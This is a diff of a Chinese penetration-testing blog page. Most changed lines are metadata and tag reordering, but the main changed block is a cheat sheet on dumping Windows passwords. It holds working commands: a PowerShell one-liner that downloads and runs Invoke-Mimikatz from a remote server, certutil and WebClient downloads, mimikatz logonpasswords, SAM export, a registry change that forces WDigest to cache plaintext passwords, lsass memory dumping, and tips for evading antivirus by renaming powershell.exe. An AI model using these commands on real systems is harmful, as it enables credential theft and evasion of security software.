@@ -45,7 +45,7 @@
         content="2021-09-04">
       <meta 
         property="og:article:modified_time" 
-        content="2021-09-04">
+        content="2021-09-05">
       <meta 
         property="og:article:author" 
         content="沉墨">
@@ -289,7 +289,7 @@
     
     
       <span class="dot"></span>
-      <span>635 字</span>
+      <span>638 字</span>
     
   </div>
   
@@ -333,7 +333,7 @@
 </tr>
 <tr>
 <td>密码抓取</td>
-<td>hash：lazagne、pwdump     <br>抓取明文：quarksPwdump、netripper        <br><br>powershell脚本：（2008+）     <br><a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a>  <br><br>1、本地执行：  <br><code>powershell.exe -exec bypass -Command &quot;Import-Module  .\Get-PassHashes.ps1;Get-PassHashes&quot;</code> <br><br>可以将脚本放在远程服务器端，远程执行；或保存成bat脚本执行     <br><br>2、远程执行：  <br><code>powershell.exe  IEX (New-Object  Net.WebClient).DownloadString(&#39;http://192.168.21.112:9000/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz</code>  注：powershell.exe可以替换，copy powershell为自定义文件，用来替换bat中的powershell.exe，可绕火绒     powershell位置：<br><code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code><br><br>3、远程下载到本地：  <br><code>powershell.exe $client = new-object System.Net.WebClient;$client.DownloadFile(&#39;http://192.168.21.112:9000/procdump64.exe&#39;, &#39;C:\www\procdum64.exe&#39;)</code>     <br>其他下载：  <br><code>certutil.exe  -urlcache -split -f http://192.168.1.115/robots.txt  c:\a.txt</code>  <br><code>certutil.exe  -urlcache -split -f http://192.168.1.115/robots.txt  delete</code>     清理缓存     <br><br>4、综合：<br>mimikatz  内网工具  <br>使用：  <br>privilege::debug  //提升权限  <br>sekurlsa::logonpasswords  //抓取密码  <br>mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit 直接执行  <br><br>常用：<br>保存为日志文件:<br><code>mimikatz.exe  &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit  &gt;&gt; log.txt</code>      <br>遇到杀软，可使用计划任务+bat脚本调用，多层嵌套绕过  <br>或  <code>reg save hklm\sam sam.bak</code>    导出文件及<code>system、security</code>  <br>然后使用mimikatz解密 :<br><code>mimikatz.exe  &quot;lsadump::sam /system:system.bak /sam:sam.bak&quot; exit</code>     <br><br>1、2012+之后不再保存明文密码，需要修改注册表  <br><code>reg add  hkey_local_machine\system\currentcontrolset\control\securityproviders\wdigest\  /v uselogoncredential  /t reg_dword /d 1 /</code>  <br>2016命令为：  <br><code>reg  add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v  UseLogonCredential /t REG_DWORD /d 1 /f</code>     <br>2、重启系统：<br><code>shutdown /r  /t 0</code>（需要重新登录系统）  <br>3、使用procdump抓取内存数据  <br><code>procdump64.exe  -accepteula -ma lsass.exe lsass.dmp</code>  <br>4、mimikatz获取明文信息  <br><code>mimikatz.exe  &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords  full&quot; exit &gt;&gt; 1.txt </code><br><br><br>其他：<br>msf的kiwi模块<br>meterpreter下load kiwi<br>具体用法自行-h</td>
+<td>hash：lazagne、pwdump     <br>抓取明文：quarksPwdump、netripper        <br><br>powershell脚本：（2008+）     <br><a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a>  <br><br>1、本地执行：  <br><code>powershell.exe -exec bypass -Command &quot;Import-Module  .\Get-PassHashes.ps1;Get-PassHashes&quot;</code> <br><br>可以将脚本放在远程服务器端，远程执行；或保存成bat脚本执行     <br><br>2、远程执行：  <br><code>powershell.exe  IEX (New-Object  Net.WebClient).DownloadString(&#39;http://192.168.21.112:9000/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz</code>  注：powershell.exe可以替换，copy powershell为自定义文件，用来替换bat中的powershell.exe，可绕火绒     powershell位置：<br><code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code><br><br>3、远程下载到本地：  <br><code>powershell.exe $client = new-object System.Net.WebClient;$client.DownloadFile(&#39;http://192.168.21.112:9000/procdump64.exe&#39;, &#39;C:\www\procdum64.exe&#39;)</code>     <br>其他下载：  <br><code>certutil.exe  -urlcache -split -f http://192.168.1.115/robots.txt  c:\a.txt</code>  <br><code>certutil.exe  -urlcache -split -f http://192.168.1.115/robots.txt  delete</code>     清理缓存     <br><br>4、综合：<br>mimikatz  内网工具  <br>使用：  <br>privilege::debug  //提升权限  <br>sekurlsa::logonpasswords  //抓取密码  <br>mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit 直接执行  <br><br>常用：<br>保存为日志文件:<br><code>mimikatz.exe  &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit  &gt;&gt; log.txt</code>      <br>遇到杀软，可使用计划任务+bat脚本调用，多层嵌套绕过  <br>或  <code>reg save hklm\sam sam.bak</code>    导出文件及<code>system、security</code>  <br>然后使用mimikatz解密 :<br><code>mimikatz.exe  &quot;lsadump::sam /system:system.bak /sam:sam.bak&quot; exit</code>     <br><br>1、2012+之后不再保存明文密码，需要修改注册表  <br><code>reg add  hkey_local_machine\system\currentcontrolset\control\securityproviders\wdigest\  /v uselogoncredential  /t reg_dword /d 1 /</code>  <br>2016命令为：  <br><code>reg  add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v  UseLogonCredential /t REG_DWORD /d 1 /f</code>     <br>2、重启系统：<br><code>shutdown /r  /t 0</code>（需要重新登录系统）  <br>3、使用procdump抓取内存数据  <br><code>procdump64.exe  -accepteula -ma lsass.exe lsass.dmp</code>  <br>4、mimikatz获取明文信息  <br><code>mimikatz.exe  &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords  full&quot; exit &gt;&gt; 1.txt </code><br><br><br>其他：<br>msf的kiwi、mimikatz模块<br>meterpreter下load kiwi、load mimikatz<br>具体用法自行-h</td>
 </tr>
 </tbody></table>
 <p>mssql命令执行绕过360检测</p>
@@ -530,10 +530,10 @@
         </div>
       </a>
     
-      <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
+      <a href="/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/">
         <div class="categories-list-item">
-          网络基础
-          <span class="categories-list-item-badge">2</span>
+          编程基础
+          <span class="categories-list-item-badge">3</span>
         </div>
       </a>
     
@@ -544,10 +544,10 @@
         </div>
       </a>
     
-      <a href="/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/">
+      <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
         <div class="categories-list-item">
-          编程基础
-          <span class="categories-list-item-badge">3</span>
+          网络基础
+          <span class="categories-list-item-badge">2</span>
         </div>
       </a>
     
@@ -633,9 +633,9 @@
       </a>
     
       <a 
-        href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" 
-        title="逻辑漏洞">
-        <div class="tags-list-item">逻辑漏洞</div>
+        href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" 
+        title="网络协议">
+        <div class="tags-list-item">网络协议</div>
       </a>
     
       <a 
@@ -651,21 +651,9 @@
       </a>
     
       <a 
-        href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" 
-        title="网络协议">
-        <div class="tags-list-item">网络协议</div>
-      </a>
-    
-      <a 
-        href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" 
-        title="权限维持">
-        <div class="tags-list-item">权限维持</div>
-      </a>
-    
-      <a 
-        href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" 
-        title="文件包含">
-        <div class="tags-list-item">文件包含</div>
+        href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" 
+        title="逻辑漏洞">
+        <div class="tags-list-item">逻辑漏洞</div>
       </a>
     
       <a 
@@ -675,15 +663,39 @@
       </a>
     
       <a 
+        href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" 
+        title="权限维持">
+        <div class="tags-list-item">权限维持</div>
+      </a>
+    
+      <a 
         href="/tags/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/" 
         title="综合靶场">
         <div class="tags-list-item">综合靶场</div>
       </a>
     
       <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" 
+        title="文件包含">
+        <div class="tags-list-item">文件包含</div>
+      </a>
+    
+      <a 
         href="/tags/%E5%8D%9A%E5%AE%A2/" 
         title="博客">
         <div class="tags-list-item">博客</div>
+      </a>
+    
+      <a 
+        href="/tags/Apache/" 
+        title="Apache">
+        <div class="tags-list-item">Apache</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/" 
+        title="入侵排查">
+        <div class="tags-list-item">入侵排查</div>
       </a>
     
       <a 
@@ -696,18 +708,6 @@
         href="/tags/Nginx/" 
         title="Nginx">
         <div class="tags-list-item">Nginx</div>
-      </a>
-    
-      <a 
-        href="/tags/Apache/" 
-        title="Apache">
-        <div class="tags-list-item">Apache</div>
-      </a>
-    
-      <a 
-        href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" 
-        title="命令执行">
-        <div class="tags-list-item">命令执行</div>
       </a>
     
   </div>
